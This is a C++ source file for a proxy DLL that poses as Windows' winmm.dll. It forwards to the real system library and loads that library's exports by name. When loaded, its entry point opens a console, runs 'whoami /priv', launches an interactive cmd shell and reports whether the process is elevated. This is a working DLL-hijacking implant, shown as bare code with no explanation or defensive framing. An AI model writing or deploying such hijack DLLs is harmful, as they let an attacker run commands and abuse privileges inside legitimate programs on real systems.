#include <windows.h>
#include <iostream>
#include <cstdio>

extern "C" {
    FARPROC originalFuncs[182] = { 0 };
    HMODULE hOriginal = NULL;
}

void LoadOriginalDll() {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\winmm.dll");
    hOriginal = LoadLibraryA(path);
    if (!hOriginal) return;

    const char* names[] = {
        "CloseDriver",                    // 0
        "DefDriverProc",                  // 1
        "DriverCallback",                 // 2
        "DrvGetModuleHandle",             // 3
        "GetDriverModuleHandle",          // 4
        "OpenDriver",                     // 5
        "PlaySound",                      // 6
        "PlaySoundA",                     // 7
        "PlaySoundW",                     // 8
        "SendDriverMessage",              // 9
        "WOWAppExit",                     // 10
        "auxGetDevCapsA",                 // 11
        "auxGetDevCapsW",                 // 12
        "auxGetNumDevs",                  // 13
        "auxGetVolume",                   // 14
        "auxOutMessage",                  // 15
        "auxSetVolume",                   // 16
        "joyConfigChanged",              // 17
        "joyGetDevCapsA",                // 18
        "joyGetDevCapsW",                // 19
        "joyGetNumDevs",                 // 20
        "joyGetPos",                     // 21
        "joyGetPosEx",                   // 22
        "joyGetThreshold",               // 23
        "joyReleaseCapture",             // 24
        "joySetCapture",                 // 25
        "joySetThreshold",               // 26
        "mciDriverNotify",               // 27
        "mciDriverYield",                // 28
        "mciExecute",                    // 29
        "mciFreeCommandResource",        // 30
        "mciGetCreatorTask",             // 31
        "mciGetDeviceIDA",               // 32
        "mciGetDeviceIDFromElementIDA",  // 33
        "mciGetDeviceIDFromElementIDW",  // 34
        "mciGetDeviceIDW",               // 35
        "mciGetDriverData",              // 36
        "mciGetErrorStringA",            // 37
        "mciGetErrorStringW",            // 38
        "mciGetYieldProc",               // 39
        "mciLoadCommandResource",        // 40
        "mciSendCommandA",               // 41
        "mciSendCommandW",               // 42
        "mciSendStringA",                // 43
        "mciSendStringW",                // 44
        "mciSetDriverData",              // 45
        "mciSetYieldProc",               // 46
        "midiConnect",                   // 47
        "midiDisconnect",                // 48
        "midiInAddBuffer",               // 49
        "midiInClose",                   // 50
        "midiInGetDevCapsA",             // 51
        "midiInGetDevCapsW",             // 52
        "midiInGetErrorTextA",           // 53
        "midiInGetErrorTextW",           // 54
        "midiInGetID",                   // 55
        "midiInGetNumDevs",              // 56
        "midiInMessage",                 // 57
        "midiInOpen",                    // 58
        "midiInPrepareHeader",           // 59
        "midiInReset",                   // 60
        "midiInStart",                   // 61
        "midiInStop",                    // 62
        "midiInUnprepareHeader",         // 63
        "midiOutCacheDrumPatches",       // 64
        "midiOutCachePatches",           // 65
        "midiOutClose",                  // 66
        "midiOutGetDevCapsA",            // 67
        "midiOutGetDevCapsW",            // 68
        "midiOutGetErrorTextA",          // 69
        "midiOutGetErrorTextW",          // 70
        "midiOutGetID",                  // 71
        "midiOutGetNumDevs",             // 72
        "midiOutGetVolume",              // 73
        "midiOutLongMsg",                // 74
        "midiOutMessage",                // 75
        "midiOutOpen",                   // 76
        "midiOutPrepareHeader",          // 77
        "midiOutReset",                  // 78
        "midiOutSetVolume",              // 79
        "midiOutShortMsg",               // 80
        "midiOutUnprepareHeader",        // 81
        "midiStreamClose",              // 82
        "midiStreamOpen",               // 83
        "midiStreamOut",                // 84
        "midiStreamPause",              // 85
        "midiStreamPosition",           // 86
        "midiStreamProperty",           // 87
        "midiStreamRestart",            // 88
        "midiStreamStop",               // 89
        "mixerClose",                    // 90
        "mixerGetControlDetailsA",       // 91
        "mixerGetControlDetailsW",       // 92
        "mixerGetDevCapsA",              // 93
        "mixerGetDevCapsW",              // 94
        "mixerGetID",                    // 95
        "mixerGetLineControlsA",         // 96
        "mixerGetLineControlsW",         // 97
        "mixerGetLineInfoA",             // 98
        "mixerGetLineInfoW",             // 99
        "mixerGetNumDevs",               // 100
        "mixerMessage",                  // 101
        "mixerOpen",                     // 102
        "mixerSetControlDetails",        // 103
        "mmDrvInstall",                  // 104
        "mmGetCurrentTask",              // 105
        "mmTaskBlock",                   // 106
        "mmTaskCreate",                  // 107
        "mmTaskSignal",                  // 108
        "mmTaskYield",                   // 109
        "mmioAdvance",                   // 110
        "mmioAscend",                    // 111
        "mmioClose",                     // 112
        "mmioCreateChunk",               // 113
        "mmioDescend",                   // 114
        "mmioFlush",                     // 115
        "mmioGetInfo",                   // 116
        "mmioInstallIOProcA",            // 117
        "mmioInstallIOProcW",            // 118
        "mmioOpenA",                     // 119
        "mmioOpenW",                     // 120
        "mmioRead",                      // 121
        "mmioRenameA",                   // 122
        "mmioRenameW",                   // 123
        "mmioSeek",                      // 124
        "mmioSendMessage",               // 125
        "mmioSetBuffer",                 // 126
        "mmioSetInfo",                   // 127
        "mmioStringToFOURCCA",           // 128
        "mmioStringToFOURCCW",           // 129
        "mmioWrite",                     // 130
        "mmsystemGetVersion",            // 131
        "sndPlaySoundA",                 // 132
        "sndPlaySoundW",                 // 133
        "timeBeginPeriod",               // 134
        "timeEndPeriod",                 // 135
        "timeGetDevCaps",                // 136
        "timeGetSystemTime",             // 137
        "timeGetTime",                   // 138
        "timeKillEvent",                 // 139
        "timeSetEvent",                  // 140
        "waveInAddBuffer",               // 141
        "waveInClose",                   // 142
        "waveInGetDevCapsA",             // 143
        "waveInGetDevCapsW",             // 144
        "waveInGetErrorTextA",           // 145
        "waveInGetErrorTextW",           // 146
        "waveInGetID",                   // 147
        "waveInGetNumDevs",              // 148
        "waveInGetPosition",             // 149
        "waveInMessage",                 // 150
        "waveInOpen",                    // 151
        "waveInPrepareHeader",           // 152
        "waveInReset",                   // 153
        "waveInStart",                   // 154
        "waveInStop",                    // 155
        "waveInUnprepareHeader",         // 156
        "waveOutBreakLoop",              // 157
        "waveOutClose",                  // 158
        "waveOutGetDevCapsA",            // 159
        "waveOutGetDevCapsW",            // 160
        "waveOutGetErrorTextA",          // 161
        "waveOutGetErrorTextW",          // 162
        "waveOutGetID",                  // 163
        "waveOutGetNumDevs",             // 164
        "waveOutGetPitch",               // 165
        "waveOutGetPlaybackRate",        // 166
        "waveOutGetPosition",            // 167
        "waveOutGetVolume",              // 168
        "waveOutMessage",                // 169
        "waveOutOpen",                   // 170
        "waveOutPause",                  // 171
        "waveOutPrepareHeader",          // 172
        "waveOutReset",                  // 173
        "waveOutRestart",                // 174
        "waveOutSetPitch",               // 175
        "waveOutSetPlaybackRate",        // 176
        "waveOutSetVolume",              // 177
        "waveOutUnprepareHeader",        // 178
        "waveOutWrite",                  // 179
    };

    for (int i = 0; i < 180; i++) {
        originalFuncs[i] = GetProcAddress(hOriginal, names[i]);
    }
}

void CreateCon() {
    if (AllocConsole()) {
        FILE* fDummy;
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);

        std::cout << "Console active! \n";
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        LoadOriginalDll();

        CreateCon();
        system("whoami /priv");
        system("cmd");

        {
            BOOL isAdmin = FALSE;
            HANDLE token = NULL;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
                TOKEN_ELEVATION elev;
                DWORD size;
                if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
                    isAdmin = elev.TokenIsElevated;
                }
                CloseHandle(token);
            }
            MessageBoxA(NULL, isAdmin ? "ELEVATED" : "NOT ELEVATED", "Proxy DLL", MB_OK);
        }
        break;

    case DLL_PROCESS_DETACH:
        if (hOriginal) FreeLibrary(hOriginal);
        break;
    }
    return TRUE;
}